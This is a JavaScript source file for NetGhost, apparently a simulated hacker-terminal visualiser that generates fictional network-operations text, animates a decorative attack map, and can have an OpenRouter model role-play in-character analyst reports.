function aiLoad(){ try{const s=JSON.parse(localStorage.getItem(AI_LS)||"null");if(s)W.ai={enabled:!!s.enabled,key:s.key||"",model:s.model||"openai/gpt-4o-mini"};}catch(e){} }
function aiSave(){ try{localStorage.setItem(AI_LS,JSON.stringify(W.ai));}catch(e){} }
async function callOpenRouter(messages){
  const r=await fetch("https://openrouter.ai/api/v1/chat/completions",{
    method:"POST",
    headers:{"Content-Type":"application/json","Authorization":"Bearer "+W.ai.key,
      "HTTP-Referer":"https://github.com/apojidelegraphics/NetGhost","X-Title":"NetGhost"},
    body:JSON.stringify({model:W.ai.model||"openai/gpt-4o-mini",messages,max_tokens:500,temperature:0.8,reasoning:{exclude:true}})
  });
  if(!r.ok)throw new Error("HTTP "+r.status+(r.status===401?" bad key":r.status===402?" no credits":""));
  const j=await r.json();
  return (((((j.choices||[])[0]||{}).message)||{}).content||"").trim();
}
/* strip reasoning/preamble some models leak; return clean report lines */
function cleanReport(t){
  t=String(t).replace(/<think>[\s\S]*?<\/think>/gi,"").replace(/<\/?think>/gi,"").replace(/```[a-z]*\n?|```/gi,"");
  const meta=/^(the user|i need to|i'?ll\b|i will\b|i should|i'?m going|let me|let'?s|okay\b|ok[, ]|sure[,.\s]|here(?:'s| is| are)|report:|analysis:|topic:|telemetry:|constraints?\b|output\b|note to self|as (?:the |a )?[a-z-]+[, ]?(?:analyst|bot)\b)/i;
  return t.split(/\r?\n/)
    .map(s=>s.replace(/^[\s>#*\-•]+/,"").replace(/\*\*/g,"").trim())
    .filter(l=>l.length>1 && !meta.test(l)
      && !/^\d+[-–]\d+\s+lines/i.test(l)
      && !/(plain terminal|no markdown|cinematic|reference the given|3[-– ]to[-– ]6|short,? punchy)/i.test(l))
    .slice(0,8);
}
function worldSummary(){
  const br=W.targets.filter(t=>t.breached);
  return [
    `scene=${SCENES[W.scene]?SCENES[W.scene].name:W.scene} hosts=${W.targets.length} breached=${br.length} threat=${W.threatScore}/100 hops=${W.hops.length}`,
    "hosts: "+W.targets.slice(0,6).map(t=>`${t.host}(${t.ports.filter(p=>p.state==="open").length}open${t.breached?",BREACHED":""})`).join(", "),
    "recent: "+(W.threats.slice(0,4).map(t=>t.txt).join(" | ")||"none")
  ].join("\n");
}
const AGENTS=["GHOST-ANALYST","RECON-ORACLE","THREAT-SEER","NET-WARDEN","SIGINT-BOT"];
const AGENT_TOPICS=["current operation","threat posture","the breached hosts","exfil risk","next move","the proxy chain","open attack surface"];
const AGENT_ACTIONS=["pushing a fix","flagging a threat","recommending rotation","escalating watch","queuing remediation","opening a ticket","advising isolation","greenlighting the next step"];
const AGENT_PERSONA={
  "GHOST-ANALYST":"clinical, precise and understated",
  "RECON-ORACLE":"curious and probing — you think out loud and ask what-ifs",
  "THREAT-SEER":"ominous and cryptic — you speak in warnings and omens",
  "NET-WARDEN":"a gruff, protective blue-team defender who hates sloppiness",
  "SIGINT-BOT":"terse and robotic — clipped, numeric, no filler"
};
const AGENT_QUIP={
  "GHOST-ANALYST":["Noted and filed.","Confidence: high.","I'll keep watching this one."],
  "RECON-ORACLE":["What else is it hiding?","Curious. Very curious.","There's a door here somewhere."],
  "THREAT-SEER":["Something stirs in the dark.","I have seen this pattern end badly.","The quiet ones worry me most."],
  "NET-WARDEN":["Not on my watch.","Patch it before they do.","Sloppy. Lock it down."],
  "SIGINT-BOT":["END OF LINE.","PROBABILITY NOMINAL.","LOGGING. STANDING BY."]
};
function simLines(topic){
  const T=W.targets, br=T.filter(t=>t.breached).length, open=openPortCount(), score=W.threatScore, hops=W.hops.length;
  const scene=SCENES[W.scene]?SCENES[W.scene].name:W.scene;
  const h=()=>(R.pick(T)||{host:"the segment"}).host, port=()=>R.pick(PORTLIST);
  const recent=W.threats[0]?W.threats[0].txt:null;
  const opener=[
    ()=>`ASSESSMENT: posture ${R.pick(["nominal","elevated","degrading","critical","unstable"])} across ${T.length} tracked hosts.`,
    ()=>`SITREP: ${T.length} hosts in scope · tempo ${R.pick(["steady","rising","frantic","calm","spiking"])} · scene ${scene}.`,
    ()=>`READ: the board is ${R.pick(["quiet","heating up","lit up","holding","going sideways"])} — ${br?`${br} host(s) already folded`:"no confirmed footholds yet"}.`,
    ()=>`STATUS: ${br?`${br} breach(es) live`:"clean so far"}, threat index ${score}/100 and ${R.pick(["climbing","holding","easing off"])}.`
  ];
  const metric=[
    ()=>`${br} breach indicator(s) · ${open} open services · threat ${score}/100.`,
    ()=>`Mapped ${open} open services; the ${R.pick(["ssh","smb","rdp","http","db","vpn"])} surface looks ${R.pick(["soft","hardened","noisy","promising"])}.`,
    ()=>`${open} ports exposed across the fleet — ${h()} is carrying the most risk.`,
    ()=>`Threat index ${score}/100; ${recent?`last flag: ${recent}`:"no fresh alerts this cycle"}.`
  ];
  const infra=[
    ()=>`Attribution risk ${R.pick(["low","moderate","rising","minimal"])} behind the ${hops}-hop chain.`,
    ()=>`Exit node holding; chain depth ${hops}. Cover is ${R.pick(["solid","thinning","fine for now","getting thin"])}.`,
    ()=>`${h()} keeps answering on ${port()} — ${R.pick(["worth a knock","leave it","prime target","probably a honeypot"])}.`,
    ()=>`Proxy path ${R.pick(["stable","flapping","clean"])} over ${hops} hops; rotated ${R.i(1,58)}m ago.`
  ];
  const rec=[
    ()=>`RECOMMEND: ${R.pick(["rotate exit nodes","isolate "+h(),"escalate watch on port "+port(),"hold posture","pull creds from "+h(),"go quiet for a cycle","widen the sweep"])}.`,
    ()=>`NEXT: ${R.pick(["dump "+h()+" and move on","push the exploit on "+h(),"stand down — nothing worth the noise","consolidate access","re-scan the "+R.pick(["dmz","prod","internal"])+" segment"])}.`,
    ()=>`CALL: ${R.pick(["press it","back off","hold the line","escalate to breach"])} — ${R.pick(["low exposure","the window's open","too hot right now","clean path"])}.`
  ];
  const flavor=[
    ()=>`Gut says ${R.pick(["someone's watching back","this is too easy","we tripped something","we're clear","don't trust "+h()])}.`,
    ()=>`Note: ${h()} ${R.pick(["went dark mid-scan","just rotated keys","is logging us","looks abandoned"])}.`
  ];
  const lines=[ R.pick(opener)(), R.pick(metric)(), R.pick(infra)() ];
  if(R.chance(.5)) lines.push(R.pick(flavor)());
  lines.push(R.pick(rec)());
  return lines;
}
function aiQuotaOk(){ const now=Date.now(); W.aiCalls=W.aiCalls.filter(t=>now-t<3600000); return W.aiCalls.length<2; }
/* agent reports go to the AGENT.FEED panel; the stream only gets a one-liner */
function postAgent(who,topic,lines,src){
  const entry={who,topic,lines,src,t:new Date().toTimeString().slice(0,8)};
  W.agents.unshift(entry); W.agents=W.agents.slice(0,30); renderAgents();
  sendSync({t:"agent",entry});
}
function renderAgents(){
  const c=document.getElementById("agentct"); if(c)c.textContent=W.agents.length;
  const el=document.getElementById("agentfeed"); if(!el)return;
  el.innerHTML=W.agents.slice(0,12).map(a=>
    `<div class="agent"><div class="ahead"><span class="awho">${esc(a.who)}</span><span class="atime">${esc(a.t)}</span></div>`+
    `<div class="atopic">re: ${esc(a.topic)}</div>`+
    a.lines.map(l=>`<div class="aline">${esc(l)}</div>`).join("")+
    `<div class="asrc">${esc(a.src)}</div></div>`).join("");
}
async function aiAgent(query,isAuto,isEvent){
  const who=R.pick(AGENTS), topic=query||R.pick(AGENT_TOPICS);
  let lines, src;
  const canAI = W.ai.enabled && W.ai.key && (!isAuto || aiQuotaOk());
  if(canAI){
    if(isAuto) W.aiCalls.push(Date.now());   // auto calls count against the 2/hr budget; manual don't
    try{
      const out=await callOpenRouter([
        {role:"system",content:"You are "+who+", a cyber-ops analyst speaking inside the fictional NetGhost terminal. Everything here is a harmless SIMULATION — no real infrastructure. Your voice: "+(AGENT_PERSONA[who]||"terse and confident")+" — stay in character. Output ONLY the report: 3 to 5 short lines of plain terminal text. Hard rules: no markdown, no bullet symbols, no preamble, no sign-off; do NOT restate, acknowledge, or reason about the task or these rules; begin immediately with the first line. Reference the actual hosts and threats in the telemetry. If the topic is a question, answer it directly and briefly. If it is nonsensical, note that in one short line, then report on the current operation."},
        {role:"user",content:"Topic: "+topic+"\nTelemetry:\n"+worldSummary()}
      ]);
      lines=cleanReport(out); src="OpenRouter · "+(W.ai.model||"");
      if(!lines.length){ lines=simLines(topic); src="local (model returned nothing usable)"; }
    }catch(e){ lines=simLines(topic);
      const m=/Failed to fetch|NetworkError|load failed|CSP|blocked/i.test(e.message||"")?"network blocked here — live AI works in the desktop app":(e.message||"error");
      src="local ("+m+")"; }
  } else {
    lines=simLines(topic);
    src=(W.ai.enabled&&W.ai.key&&isAuto)?"local · auto-AI budget (2/hr) spent — type 'agent' for live":"local analysis";
  }
  if(/^local/.test(src)&&AGENT_QUIP[who]&&R.chance(.6)) lines.push("— "+R.pick(AGENT_QUIP[who]));
  if(isEvent) wl(red("⚠ ")+wht(who)+dim(" reacting → ")+amber(topic.replace(/^⚠ /,""))+dim("  (see AGENT.FEED)"));
  else wl(mag("◆ ")+wht(who)+dim(" responded → ")+fg(R.pick(AGENT_ACTIONS))+dim("  (see AGENT.FEED)"));
  postAgent(who,topic.replace(/^⚠ /,""),lines,src);
}
/* event-reactive agents: fire on breaches / threat going critical (debounced) */
function agentEvent(reason){
  if(IS_MON||!active())return;
  const now=Date.now(); if(now-(W.lastEvent||0)<20000)return; W.lastEvent=now;
  aiAgent("⚠ "+reason, true, true);
}
/* ----- stream / OBS ----- */
function setKiosk(on){ document.body.classList.toggle("kiosk",on); try{fit.fit();}catch(e){} }
function setTransparent(on){ document.body.classList.toggle("transparent",on); term.options.theme={...term.options.theme,background:on?"rgba(0,0,0,0)":"#07070a"}; }
function toggleKiosk(){ setKiosk(!document.body.classList.contains("kiosk")); }
function applyParams(){
  const hashQ=location.hash.includes("?")?location.hash.split("?")[1]:"";
  const q=new URLSearchParams(location.search+(hashQ?"&"+hashQ:"")); const g=k=>q.get(k);
  if(THEMES[g("theme")])applyTheme(g("theme"));
  if(SCENES[g("scene")])setScene(g("scene"),true);
  if(SPEEDS[g("speed")]){W.speed=g("speed");startClocks();}
  if(g("transparent")==="1")setTransparent(true);
  if(g("kiosk")==="1")setKiosk(true);
  if(g("ghost")==="1")setTimeout(()=>{if(!W.ghost)toggleGhost();},1600);
}
function obsHelp(){
  wl(pri("Stream / OBS mode")+dim("  — append URL params (great as an OBS browser source):"));
  wl(dim("  ?scene=redteam&theme=amber&speed=fast")+dim("   preset the look"));
  wl(dim("  ?ghost=1")+dim("        auto-engage Auto-Ghost"));
  wl(dim("  ?kiosk=1")+dim("        hide all chrome — terminal only"));
  wl(dim("  ?transparent=1")+dim("  transparent background for an overlay"));
  wl(dim("  console: ")+fg("kiosk")+dim(" toggles chrome anytime"));wl("");
}

/* ============================================================================
   CONFIG PANEL
   ========================================================================== */
const CFG=[
  {g:"scene",opts:[["ghostnet","GHOSTNET"],["recon","RECON"],["redteam","RED-TEAM"],["ddos","DDoS"],["soc","SOC"]],get:()=>W.scene,set:v=>setScene(v)},
  {g:"theme",opts:[["green","GREEN"],["amber","AMBER"],["cyan","CYAN"],["clash","MAGENTA"],["mono","MONO"]],get:()=>W.theme,set:v=>applyTheme(v)},
  {g:"speed",opts:[["slow","SLOW"],["normal","NORMAL"],["fast","FAST"],["overdrive","OVERDRIVE"]],get:()=>W.speed,set:v=>{W.speed=v;startClocks();}},
  {g:"density",opts:[["sparse","SPARSE"],["normal","NORMAL"],["dense","DENSE"]],get:()=>W.density,set:v=>{W.density=v;}},
  {g:"scan",opts:[["on","ON"],["off","OFF"]],get:()=>document.body.classList.contains("noscan")?"off":"on",set:v=>document.body.classList.toggle("noscan",v==="off")},
  {g:"grime",opts:[["on","ON"],["off","OFF"]],get:()=>document.body.classList.contains("nogrime")?"off":"on",set:v=>document.body.classList.toggle("nogrime",v==="off")},
  {g:"flicker",opts:[["on","ON"],["off","OFF"]],get:()=>document.body.classList.contains("noflicker")?"off":"on",set:v=>document.body.classList.toggle("noflicker",v==="off")},
  {g:"ghost",opts:[["on","ON"],["off","OFF"]],get:()=>W.ghost?"on":"off",set:v=>{if((v==="on")!==W.ghost)toggleGhost();}},
  {g:"autoplug",opts:[["on","ON"],["off","OFF"]],get:()=>W.pluginsAuto?"on":"off",set:v=>{W.pluginsAuto=(v==="on");}},
  {g:"director",opts:[["on","ON"],["off","OFF"]],get:()=>W.director?"on":"off",set:v=>{W.director=(v==="on");}},
  {g:"ai",opts:[["on","ON"],["off","OFF"]],get:()=>W.ai.enabled?"on":"off",set:v=>{W.ai.enabled=(v==="on");const row=document.getElementById("airow");if(row)row.style.display=W.ai.enabled?"block":"none";aiSave();}}
];
function buildCfg(){
  CFG.forEach(row=>{
    const host=document.querySelector(`.opts[data-group="${row.g}"]`);
    if(!host)return;
    host.innerHTML=row.opts.map(o=>`<span class="opt" data-v="${o[0]}">${o[1]}</span>`).join("");
    host.querySelectorAll(".opt").forEach(o=>o.onclick=()=>{row.set(o.dataset.v);syncCfg();});
  });
  const k=document.getElementById("ai-key"),m=document.getElementById("ai-model"),row=document.getElementById("airow");
  if(k){k.value=W.ai.key||"";k.onchange=e=>{W.ai.key=e.target.value.trim();aiSave();};}
  if(m){m.value=W.ai.model||"";m.onchange=e=>{W.ai.model=e.target.value.trim();aiSave();};}
  if(row)row.style.display=W.ai.enabled?"block":"none";
  syncCfg();
}
function syncCfg(){
  CFG.forEach(row=>{const cur=row.get();document.querySelectorAll(`.opts[data-group="${row.g}"] .opt`).forEach(o=>o.classList.toggle("sel",o.dataset.v===cur));});
  const s=SCENES[W.scene];if(s)document.getElementById("scenedesc").textContent=s.desc;
  saveCfg();
}
function openCfg(){syncCfg();document.getElementById("cfgwrap").classList.add("show");}
function closeCfg(){document.getElementById("cfgwrap").classList.remove("show");term.focus();}

/* ---- packages overlay (clickable pkg store) ---- */
function renderPkgOverlay(){
  const esc=s=>String(s).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
  const ids=Object.keys(PLUGINS);
  const body=document.getElementById("pkgbody");
  if(!ids.length){body.innerHTML='<div class="pkgdesc" style="padding:12px">No packages registered.</div>';return;}
  body.innerHTML=ids.map(id=>{
    const p=PLUGINS[id], on=!!ENABLED[id], bits=[];
    if(p.commands)bits.push("cmd: "+Object.keys(p.commands).join(" "));
    if(p.scenes)bits.push("scene: "+Object.keys(p.scenes).join(" "));
    if(p.themes)bits.push("theme: "+Object.keys(p.themes).join(" "));
    const sweepable = on && p.scenes && Object.keys(p.scenes).length;
    const inSweep = !W.sweepExclude.includes(id);
    const chk = sweepable?`<span class="pkgcheck ${inSweep?'on':''}" data-sweep="${esc(id)}" title="include in the minute sweep"><span class="box">${inSweep?'✓':''}</span>sweep</span>`:'';
    return `<div class="pkgrow"><div class="pkgmeta">
      <div class="pkgname">${on?'<span class="pkgon">● </span>':''}${esc(p.name)}<span class="pkgid">${esc(id)}</span></div>
      <div class="pkgdesc">${esc(p.desc||"")}</div>
      <div class="pkgbits">${esc(bits.join("   ·   "))}</div></div>
      ${chk}
      <button class="b ${on?'':'on'}" data-pkg="${esc(id)}">${on?'REMOVE':'INSTALL'}</button></div>`;
  }).join("");
  body.querySelectorAll(".pkgcheck[data-sweep]").forEach(c=>c.onclick=()=>{
    const id=c.dataset.sweep, i=W.sweepExclude.indexOf(id);
    if(i>=0)W.sweepExclude.splice(i,1); else W.sweepExclude.push(id);
    saveCfg(); renderPkgOverlay();
  });
  body.querySelectorAll("button[data-pkg]").forEach(b=>b.onclick=()=>{
    const id=b.dataset.pkg;
    if(ENABLED[id]){disablePlugin(id);wl(dim("[pkg] removed ")+fg(id));}
    else{enablePlugin(id,true);wl(pri("[pkg] installed ")+fg(id));}
    renderPkgOverlay();
  });
}
function openPkg(){renderPkgOverlay();document.getElementById("pkgwrap").classList.add("show");}
function closePkg(){document.getElementById("pkgwrap").classList.remove("show");term.focus();}

/* ---- world attack map overlay ---- */
const CC_XY={US:[-100,40],CA:[-106,56],BR:[-51,-10],NL:[5,52],DE:[10,51],SE:[18,62],CH:[8,47],RO:[25,46],IS:[-19,65],ZA:[25,-29],RU:[90,60],CN:[105,35],IN:[78,22],IR:[53,32],SG:[103,1],JP:[138,36],VN:[106,16]};
function lonlat(a){return [ (a[0]+180)/360*1000, (90-a[1])/180*500 ];}
const SVGNS="http://www.w3.org/2000/svg";
function svgEl(tag,attrs){const e=document.createElementNS(SVGNS,tag);for(const k in attrs)e.setAttribute(k,attrs[k]);return e;}
let mapTimer=null, mapBuilt=false;
function buildMap(){
  if(mapBuilt)return; mapBuilt=true;
  const grid=document.getElementById("map-grid"), dots=document.getElementById("map-dots");
  let g=""; for(let x=0;x<=1000;x+=1000/12)g+=`<line x1="${x}" y1="0" x2="${x}" y2="500"/>`;
  for(let y=0;y<=500;y+=500/6)g+=`<line x1="0" y1="${y}" x2="1000" y2="${y}"/>`;
  grid.innerHTML=g;
  let d=""; for(const cc in CC_XY){const p=lonlat(CC_XY[cc]);d+=`<circle class="cc" cx="${p[0].toFixed(0)}" cy="${p[1].toFixed(0)}" r="2.4"/>`;}
  for(let i=0;i<190;i++)d+=`<circle cx="${R.i(15,985)}" cy="${R.i(15,485)}" r="${R.chance(.2)?1.4:0.8}"/>`;
  dots.innerHTML=d;
}
function spawnArc(){
  const arcs=document.getElementById("map-arcs"), blips=document.getElementById("map-blips"); if(!arcs)return;
  const ccs=Object.keys(CC_XY);
  const o=lonlat(CC_XY[R.pick(ccs)]);
  const t=R.chance(.5)?lonlat(CC_XY[R.pick(ccs)]):[R.i(60,940),R.i(40,460)];
  const mx=(o[0]+t[0])/2, my=Math.min(o[1],t[1])-R.i(40,150);
  const sev=R.chance(.18)?"crit":R.chance(.4)?"high":"low";
  const col=sev==="crit"?"var(--red)":sev==="high"?"var(--amber)":"var(--primary)";
  const p=svgEl("path",{d:`M${o[0].toFixed(0)},${o[1].toFixed(0)} Q${mx.toFixed(0)},${my.toFixed(0)} ${t[0].toFixed(0)},${t[1].toFixed(0)}`,stroke:col}); p.setAttribute("pathLength","1");
  arcs.appendChild(p); setTimeout(()=>p.remove(),2900);
  [o,t].forEach(pt=>{const b=svgEl("circle",{cx:pt[0].toFixed(0),cy:pt[1].toFixed(0),r:1,fill:col});blips.appendChild(b);setTimeout(()=>b.remove(),1400);});
  const tick=document.getElementById("mapticker");
  const line=document.createElement("div");
  line.innerHTML=`<span class="cc">${R.pick(ccs)}</span> ${randIP()} → ${privIP()}  [${R.pick(["port scan","exploit attempt","brute force","exfil","C2 beacon","DDoS"])}]`;
  tick.prepend(line); while(tick.childElementCount>6)tick.removeChild(tick.lastChild);
}
function openMap(){ buildMap(); document.getElementById("mapwrap").classList.add("show"); if(!mapTimer)mapTimer=setInterval(spawnArc,600); for(let i=0;i<4;i++)spawnArc(); }
function closeMap(){ document.getElementById("mapwrap").classList.remove("show"); clearInterval(mapTimer); mapTimer=null; term.focus(); }

/* ---------- wire controls ---------- */
document.getElementById("b-ghost").onclick=toggleGhost;
document.getElementById("b-pause").onclick=togglePause;
document.getElementById("b-pop").onclick=popOut;
document.getElementById("b-full").onclick=goFull;
document.getElementById("b-cfg").onclick=openCfg;
document.getElementById("b-pkg").onclick=openPkg;
document.getElementById("b-map").onclick=openMap;
document.getElementById("map-x").onclick=closeMap;
document.getElementById("mapwrap").addEventListener("mousedown",e=>{if(e.target.id==="mapwrap")closeMap();});
document.getElementById("pop-x").onclick=closePop;
document.getElementById("popwrap").addEventListener("mousedown",e=>{if(e.target.id==="popwrap")closePop();});
document.getElementById("cfg-x").onclick=closeCfg;
document.getElementById("cfg-ok").onclick=closeCfg;
document.getElementById("cfg-reseed").onclick=()=>{reseed();};
document.getElementById("pkg-x").onclick=closePkg;
document.getElementById("pkg-ok").onclick=closePkg;
document.getElementById("cfgwrap").addEventListener("mousedown",e=>{if(e.target.id==="cfgwrap")closeCfg();});
document.getElementById("pkgwrap").addEventListener("mousedown",e=>{if(e.target.id==="pkgwrap")closePkg();});
/* bare-letter shortcuts only when focus is OUTSIDE the terminal (e.g. a panel) */
addEventListener("keydown",e=>{
  if(mCan){if(e.key==="Escape")stopMatrix();return;}
  if(document.getElementById("popwrap").classList.contains("show")){if(e.key==="Escape")closePop();return;}
  if(document.getElementById("mapwrap").classList.contains("show")){if(e.key==="Escape")closeMap();return;}
  if(document.getElementById("pkgwrap").classList.contains("show")){if(e.key==="Escape")closePkg();return;}
  if(document.getElementById("cfgwrap").classList.contains("show")){if(e.key==="Escape")closeCfg();return;}
  if(inTerm())return; // terminal focused → let xterm's custom handler deal with it
  if(e.key==="f"||e.key==="F")goFull();
  if(e.key==="g"||e.key==="G")toggleGhost();
  if(e.key==="Escape")openCfg();
});

/* ============================================================================
   BOOT
   ========================================================================== */
function banner(){
  [ "   _  _ ___ _____ ___ _  _ ___  ___ _____ ",
    "  | \\| | __|_   _/ __| || / _ \\/ __|_   _|",
    "  | .` | _|  | || (_ | __ | (_) \\__ \\ | |  ",
    "  |_|\\_|___| |_| \\___|_||_|\\___/|___/ |_|  "
  ].forEach(l=>wl(pri(l)));
  wl(dim("  ambient net/sec engine ")+pri("v1.0")+dim("  ·  session "+SESS));
  wl(dim("  seed ")+blue("0x"+SEED.toString(16))+dim("  ·  Apoji_Delegraphics"));
  wl("");
  wl(dim("  [*] SIMULATION — procedural output, no real hosts are contacted"));
  wl("");
}
/* retro BIOS / POST screen, then clear and run the banner */
function bios(cb){
  const L=[
    ()=>wl(pri("GHOST BIOS v96.4")+dim("   Apoji Microsystems, Inc.")),
    ()=>wl(dim("CPU  : Ghost-Core x8 @ 4.20GHz ............. ")+pri("OK")),
    ()=>wl(dim("RAM  : 65536K .............................. ")+pri("OK")),
    ()=>wl(dim("STOR : ghost0  vault1  cache2 .............. ")+pri("OK")),
    ()=>wl(dim("NET  : eth0 UP · exit node negotiated ...... ")+pri("OK")),
    ()=>wl(dim("SEC  : phantom MAC · proxy chain armed ..... ")+pri("OK")),
    ()=>wl(dim("Loading GHOSTNET kernel ....................")),
    ()=>wl(dim("Press ")+wht("DEL")+dim(" to enter SETUP     boot device: GHOST0"))
  ];
  L.forEach((f,i)=>setTimeout(f,i*150));
  setTimeout(()=>{ try{term.clear();}catch(e){} cb&&cb(); }, L.length*150+400);
}
let BOOTCFG=null;
function boot(){
  const mon=location.hash==="#monitor";
  BOOTCFG=loadCfg();          // capture BEFORE buildCfg()/syncCfg() can overwrite storage
  const saved=BOOTCFG;
  aiLoad();
  buildCfg();
  applyTheme(saved&&THEMES[saved.theme]?saved.theme:"green");
  if(saved){
    if(SPEEDS[saved.speed])W.speed=saved.speed;
    if(DMUL[saved.density])W.density=saved.density;
    document.body.classList.toggle("noscan",saved.scan===false);
    document.body.classList.toggle("nogrime",saved.grime===false);
    document.body.classList.toggle("noflicker",saved.flicker===false);
    if(typeof saved.pluginsAuto==="boolean")W.pluginsAuto=saved.pluginsAuto;
    if(typeof saved.director==="boolean")W.director=saved.director;
    if(Array.isArray(saved.sweepExclude))W.sweepExclude=saved.sweepExclude;
  }
  ensureTargets(R.i(5,9));rebuildHops();renderTopo();renderThreat();renderMeters();
  setScene(saved&&SCENES[saved.scene]?saved.scene:"ghostnet",true); // plugin scenes applied after load
  startClocks();
  applyParams();
  const runIntro=()=>{
    banner();
    const seq=[
      ()=>wl(pri("[ok] ")+dim("loading procedural network engine…")),
      ()=>wl(pri("[ok] ")+dim(`discovered ${W.targets.length} candidate hosts on bridged segment`)),
      ()=>wl(pri("[ok] ")+dim(`anonymizing route · ${W.hops.length} hops · exit ${R.pick(COUNTRIES)[0]}`)),
      ()=>wl(pri("[ok] ")+dim("stream generators armed: nmap · hydra · tcpdump · syslog")),
      ()=>{wl("");wl(pri("ready — type ")+wht("ghost v_start3")+pri(" to begin the stream")+dim("   ·  'ghost' = Auto-Ghost  ·  Esc = setup  ·  'help'"));wl("");startPrompt();term.focus();}
    ];
    seq.forEach((f,i)=>setTimeout(f,350+i*340));
  };
  if(mon){W.streaming=true;document.querySelector("#controls").style.display="none";setTimeout(()=>{if(!W.ghost)toggleGhost();},2300);runIntro();}
  else bios(runIntro);
}
boot();

/* after plugins.js has registered built-ins, restore any saved plugins + scene */
addEventListener("load",()=>{
  const saved=BOOTCFG;
  if(saved&&Array.isArray(saved.plugins))saved.plugins.forEach(id=>enablePlugin(id,true));
  if(saved&&SCENES[saved.scene]&&saved.scene!==W.scene)setScene(saved.scene,true);
  applyParams(); // re-apply URL params now that plugin scenes are registered
  document.getElementById("s-scene").textContent=SCENES[W.scene].name;
  document.getElementById("mhead-scene").textContent=SCENES[W.scene].name;
  const on=Object.keys(ENABLED);
  if(on.length)setTimeout(()=>wl(dim("[pkg] restored plugins: ")+fg(on.join(" "))+"\n"),2000);
  syncCfg();
});
